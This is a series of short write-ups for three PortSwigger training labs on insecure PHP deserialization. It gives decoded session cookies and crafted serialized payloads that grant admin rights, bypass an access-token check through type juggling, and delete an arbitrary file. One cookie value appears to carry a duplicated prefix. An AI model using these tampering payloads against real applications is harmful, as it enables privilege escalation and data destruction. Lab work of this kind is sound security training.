## Modifying serialized objects

[Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

Write-up:

1. Logging in sets a session cookie: `TzTzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`

2. Base-64 decoding this gets us `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
Altering the admin value to 1, re-encoding the cookie and changing it in the lab
gets us admin access. Accessing the admin panel allows us to delete user `carlos`
and solve the lab. 

## Modifying serialized data types

[Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

Write-up:

1. Session cookie after login: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1NHRhNjMzdnNyM3p2NHVpYjdrYW92aTNta284NXVhOCI7fQ%3d%3d`. 

2. Base-64 decoding this gets us: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"u4ta633vsr3zv4uib7kaovi3mko85ua8";}`

3. Crafting the following payload, base-64 encoding it and setting session cookie gets us admin access and allows us to delete user `carlos` and solve the lab:

    `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`

## Using application functionality to exploit insecure deserialization

[Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

Write-up:

1. Decoded session cookie after login as `wiener:peter`: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sfe5z0dkqi5eq6k09qbpgak1z3gbn7x0";s:11:"avatar_link";s:19:"users/wiener/avatar";}`

2. We craft a payload to delete `morale.txt`: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sfe5z0dkqi5eq6k09qbpgak1z3gbn7x0";s:11:"avatar_link";s:10:"morale.txt";}`

3. Re-encoding it, setting as session cookie and deleting our account allows us to solve the lab.

